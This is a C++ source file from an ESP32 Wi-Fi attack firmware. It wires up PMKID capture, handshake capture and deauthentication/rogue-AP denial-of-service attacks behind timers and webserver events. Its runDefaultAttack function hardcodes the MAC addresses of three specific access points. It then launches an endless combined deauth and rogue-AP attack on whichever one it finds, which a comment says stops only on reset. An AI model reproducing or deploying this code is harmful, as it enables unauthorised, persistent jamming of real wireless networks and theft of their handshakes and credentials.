/**
 * @file attack.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-02
 * @copyright Copyright (c) 2021
 *
 * @brief Implements common attack wrapper.
 */

#include "attack.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <future>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "Task.h"
#include "attack_dos.h"
#include "attack_handshake.h"
#include "attack_pmkid.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "webserver.h"
#include "wifi_controller.h"

namespace {
const char* TAG = "attack";
attack_status_t gAttackStatus = {READY, (uint8_t)-1, 0, nullptr};
esp_timer_handle_t attack_timeout_handle;
}  // namespace

bool gShouldLimitAttackLogs{false};

std::string attack_get_status_json() {
  // JSON format
  // {
  //   "state": X,
  //   "type": Y
  // }
  std::string result{"{\n\r\t\"state\": "};
  result += std::to_string((uint32_t)gAttackStatus.state);
  result += ",\n\r\t\"type\": ";
  result += std::to_string((uint32_t)gAttackStatus.type);
  result += "\n\r}\n\r";
  return result;
}

const attack_status_t* attack_get_status() { return &gAttackStatus; }

void attack_update_status(attack_state_t state) {
  gAttackStatus.state = state;
  if (state == FINISHED) {
    ESP_LOGD(TAG, "Stopping attack timeout timer");
    ESP_ERROR_CHECK(esp_timer_stop(attack_timeout_handle));
  }
}

void attack_append_status_content(uint8_t* buffer, unsigned size) {
  if (size == 0) {
    ESP_LOGE(TAG, "Size can't be 0 if you want to reallocate");
    return;
  }
  // temporarily save new location in case of realloc failure to preserve current content
  char* reallocated_content = (char*)realloc(gAttackStatus.content, gAttackStatus.content_size + size);
  if (reallocated_content == NULL) {
    ESP_LOGE(TAG, "Error reallocating status content! Status content may not be complete.");
    return;
  }
  // copy new data after current content
  memcpy(&reallocated_content[gAttackStatus.content_size], buffer, size);
  gAttackStatus.content = reallocated_content;
  gAttackStatus.content_size += size;
}

char* attack_alloc_result_content(unsigned size) {
  gAttackStatus.content_size = size;
  gAttackStatus.content = (char*)malloc(size);
  return gAttackStatus.content;
}

// TODO(all): It is still C code by nature. So, we are using C approach (global variables)
// Need to refactor it in C++ way
static std::function<void(bool)> gAttackProgressHandler{nullptr};
void setAttackProgressHandler(std::function<void(bool isStarted)> attackProgressHandler) {
  gAttackProgressHandler = std::move(attackProgressHandler);
}

void notifyAttackStarted() {
  if (gAttackProgressHandler) {
    gAttackProgressHandler(true);
  }
}

void notifyAttackStopped() {
  if (gAttackProgressHandler) {
    gAttackProgressHandler(false);
  }
}

/**
 * @brief Callback function for attack timeout timer.
 *
 * This function is called when attack times out.
 * It updates attack status state to TIMEOUT.
 * It calls appropriate abort functions based on current attack type.
 * @param arg not used.
 */
static void attack_timeout(void* arg) {
  ESP_LOGD(TAG, "Attack timed out");

  attack_update_status(TIMEOUT);

  switch (gAttackStatus.type) {
    case ATTACK_TYPE_PMKID:
      ESP_LOGI(TAG, "Aborting PMKID attack...");
      attack_pmkid_stop();
      break;
    case ATTACK_TYPE_HANDSHAKE:
      ESP_LOGI(TAG, "Abort HANDSHAKE attack...");
      attack_handshake_stop();
      break;
    case ATTACK_TYPE_PASSIVE:
      ESP_LOGI(TAG, "Abort PASSIVE attack...");
      break;
    case ATTACK_TYPE_DOS:
      ESP_LOGI(TAG, "Abort DOS attack...");
      attack_dos_stop();
      break;
    default:
      ESP_LOGE(TAG, "Unknown attack type. Not aborting anything");
  }
  notifyAttackStopped();
}

void executeAttack(attack_config_t attack_config) {
  // Set timeout to stop attack.
  // In case it is DOS broadcast and timeout is 0, do not set timer and let attack to run forever
  // NOTE! In case of RougeAP attack, new AP will be established forever. The only way to stop it is reset: either
  // hard (button on board), either soft. Currently to trigger soft reset you need to connect to ESP32 by Bluetooth
  if (((attack_config.timeout == 0) && (attack_config.type == ATTACK_TYPE_DOS))) {
    ESP_LOGI(TAG, "Timeout is set to 0. Atack will not finish until reboot (via Bluetooth) or 'reset' command");
  } else {
    // Before starting timer, make sure previous attack is finished. If not - finish it by simulating timeout
    esp_err_t start_result = esp_timer_start_once(attack_timeout_handle, attack_config.timeout * 1000000);
    if (start_result != ESP_OK) {
      if (start_result == ESP_ERR_INVALID_STATE) {
        // Previous attack is still in progress. Try to stop it and start timer again
        esp_timer_stop(attack_timeout_handle);
        attack_timeout(NULL);  // Simulate timeout event

        ESP_ERROR_CHECK(esp_timer_start_once(attack_timeout_handle, attack_config.timeout * 1000000));
      } else {
        ESP_ERROR_CHECK(start_result);
        return;
      }
    }
  }

  notifyAttackStarted();

  gAttackStatus.state = isInfiniteAttack(attack_config) ? RUNNING_INFINITELY : RUNNING;
  gAttackStatus.type = attack_config.type;

  // start attack based on it's type
  switch (attack_config.type) {
    case ATTACK_TYPE_PMKID:
      attack_pmkid_start(std::move(attack_config));
      break;
    case ATTACK_TYPE_HANDSHAKE:
      attack_handshake_start(std::move(attack_config));
      break;
    case ATTACK_TYPE_PASSIVE:
      ESP_LOGW(TAG, "ATTACK_TYPE_PASSIVE not implemented yet!");
      break;
    case ATTACK_TYPE_DOS:
      attack_dos_start(std::move(attack_config));
      break;
    default:
      ESP_LOGE(TAG, "Unknown attack type!");
      return;
  }
}

struct AttackRequestHandlerTaskData {
  attack_config_t attack_config;
  std::promise<void> done;
};

class AttackRequestHandlerTask : public Task {
 public:
  AttackRequestHandlerTask() : Task("AttackRequestHandlerTask") {}
  void run(void* data) override;
};
AttackRequestHandlerTask gAttackRequestHandlerTask;

void AttackRequestHandlerTask::run(void* data) {
  AttackRequestHandlerTaskData* attackRequestHandlerTaskData = (AttackRequestHandlerTaskData*)data;
  executeAttack(std::move(attackRequestHandlerTaskData->attack_config));
  attackRequestHandlerTaskData->done.set_value();
}

/**
 * @brief Callback for WEBSERVER_EVENT_ATTACK_REQUEST event.
 *
 * This function handles WEBSERVER_EVENT_ATTACK_REQUEST event from event loop.
 * It parses attack_request_t structure and set initial values to gAttackStatus.
 * It sets attack state to RUNNING or RUNNING_INFINITELY.
 * It starts attack timeout timer.
 * It starts attack based on chosen type.
 *
 * @param args not used
 * @param event_base expects WEBSERVER_EVENTS
 * @param event_id expects WEBSERVER_EVENT_ATTACK_REQUEST
 * @param event_data expects attack_request_t
 */
static void attack_request_handler(void* args, esp_event_base_t event_base, int32_t event_id, void* event_data) {
  ESP_LOGI(TAG, "Starting attack...");

  attack_request_t* attack_request = (attack_request_t*)event_data;
  ap_records_t ap_records;
  for (int i = 0; i < attack_request->ap_records_len; ++i) {
    auto id = attack_request->ap_records_ids[i];
    auto wifi_ap_record_ptr = wifictl_get_ap_record(id);
    if (wifi_ap_record_ptr == NULL) {
      ESP_LOGE(TAG, "ERROR: No ap_record for id '%d'!", id);
      free(attack_request->ap_records_ids);
      return;
    }
    ap_records.push_back(std::move(wifi_ap_record_ptr));
  }
  free(attack_request->ap_records_ids);

  AttackRequestHandlerTaskData attackRequestHandlerTaskData{};
  attackRequestHandlerTaskData.attack_config.type = (attack_type_t)attack_request->type;
  attackRequestHandlerTaskData.attack_config.method = (attack_dos_methods_t)attack_request->method;
  attackRequestHandlerTaskData.attack_config.timeout = attack_request->timeout;
  attackRequestHandlerTaskData.attack_config.per_ap_timeout = attack_request->per_ap_timeout;
  attackRequestHandlerTaskData.attack_config.ap_records = std::move(ap_records);

  // NOTE! This handler is run with stack size about 2 KB, which leads to stack overflow.
  // To prevent it, create task, which has much bigger (and configurable) stack size.
  gAttackRequestHandlerTask.start(&attackRequestHandlerTaskData);

  // Wait for task to complete
  attackRequestHandlerTaskData.done.get_future().wait();
  gAttackRequestHandlerTask.stop();
}

/**
 * @brief Callback for WEBSERVER_EVENT_ATTACK_RESET event.
 *
 * This callback resets attack status by freeing previously allocated status content and putting attack to READY state.
 *
 * @param args not used
 * @param event_base expects WEBSERVER_EVENTS
 * @param event_id expects WEBSERVER_EVENT_ATTACK_RESET
 * @param event_data not used
 */
static void attack_reset_handler(void* args, esp_event_base_t event_base, int32_t event_id, void* event_data) {
  ESP_LOGD(TAG, "Resetting attack...");

  // Stop timer if it was initiated by previous attack.
  esp_timer_stop(attack_timeout_handle);
  // Simulate timeout event. We should not call attack_update_status(FINISHED), because it will not finalize
  // attack properly (ex. it will not call attack_dos_stop(), etc.)
  attack_timeout(NULL);

  if (gAttackStatus.content) {
    free(gAttackStatus.content);
    gAttackStatus.content = NULL;
  }
  gAttackStatus.content_size = 0;
  gAttackStatus.type = -1;
  gAttackStatus.state = READY;
}

/**
 * @brief Initialises common attack resources.
 *
 * Creates attack timeout timer.
 * Registers event loop event handlers.
 */
void attack_init() {
  esp_timer_create_args_t attack_timeout_args{};
  attack_timeout_args.callback = &attack_timeout;
  ESP_ERROR_CHECK(esp_timer_create(&attack_timeout_args, &attack_timeout_handle));

  ESP_ERROR_CHECK(
      esp_event_handler_register(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST, &attack_request_handler, NULL));
  ESP_ERROR_CHECK(
      esp_event_handler_register(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_RESET, &attack_reset_handler, NULL));
}

// TODO(all): It is still C code by nature. So, we are using C approach (global variables)
// Need to refactor it in C++ way
void attack_limit_logs(bool isLimited) { gShouldLimitAttackLogs = isLimited; }

bool runDefaultAttack() {
  ESP_LOGI(TAG, "Running default attack");

  constexpr uint16_t perApTimeout{60};  // It is not used in case of infinite attacks
  // Default attacks type is DOS, method COMBINE_ALL (RogueAP + Deauth)
  static const attack_config_t default_attacks[] = {
      {ATTACK_TYPE_DOS, ATTACK_DOS_METHOD_COMBINE_ALL, 0, perApTimeout, {}},  // Attack config for device #1
      {ATTACK_TYPE_DOS, ATTACK_DOS_METHOD_COMBINE_ALL, 0, perApTimeout, {}},  // Attack config for device #2
      {ATTACK_TYPE_DOS, ATTACK_DOS_METHOD_COMBINE_ALL, 0, perApTimeout, {}},  // Attack config for device #3
  };

  if (CONFIG_DEVICE_ID > (sizeof(default_attacks) / sizeof(default_attacks[0]))) {
    ESP_LOGE(TAG, "Default attack for device with ID #%d is not configured!", CONFIG_DEVICE_ID);
    return true;  // Should not retry
  }

  // MAC addresses of AP under attack
  static const uint8_t defaultTargetApMacs[][6] = {
      {0xCC, 0x71, 0x90, 0x97, 0x3C, 0x47},  // "cc:71:90:97:3c:47" for Device #1
      {0xCC, 0x71, 0x90, 0x97, 0x45, 0x17},  // "cc:71:90:97:45:17" for Device #2
      {0xD4, 0x9A, 0xA0, 0x6C, 0xDB, 0x88},  // "d4:9a:a0:6c:db:88" for Device #3
  };

  if (CONFIG_DEVICE_ID > (sizeof(defaultTargetApMacs) / sizeof(defaultTargetApMacs[0]))) {
    ESP_LOGE(TAG, "WiFi AP MAC address for default attack for device with ID #%d is not configured!", CONFIG_DEVICE_ID);
    return true;  // Should not retry
  }

  wifictl_scan_nearby_aps();
  auto apMac = defaultTargetApMacs[CONFIG_DEVICE_ID - 1];
  auto wifi_ap_record = wifictl_get_ap_record_by_mac(apMac);
  if (wifi_ap_record == nullptr) {
    ESP_LOGE(TAG, "Can not find AP with MAC address '%02x:%02x:%02x:%02x:%02x:%02x' for default attack", apMac[0],
             apMac[1], apMac[2], apMac[3], apMac[4], apMac[5]);
    return false;  // Should retry later - may be target AP will appear
  }
  ESP_LOGI(TAG, "Initiating default attack on AP with MAC '%02x:%02x:%02x:%02x:%02x:%02x' and SSID '%s'", apMac[0],
           apMac[1], apMac[2], apMac[3], apMac[4], apMac[5], wifi_ap_record->ssid);

  // Write wifi_ap_record into attack config
  auto attackConfig = default_attacks[CONFIG_DEVICE_ID - 1];
  attackConfig.ap_records.push_back(std::move(wifi_ap_record));

  executeAttack(std::move(attackConfig));

  return true;  // Attack was successfully started - no need to retry
}

bool isInfiniteAttack(const attack_config_t& attackConfig) {
  return (((attackConfig.timeout == 0) && (attackConfig.type == ATTACK_TYPE_DOS)));
}

void stopAttack() { attack_reset_handler(nullptr, nullptr, 0, nullptr); }
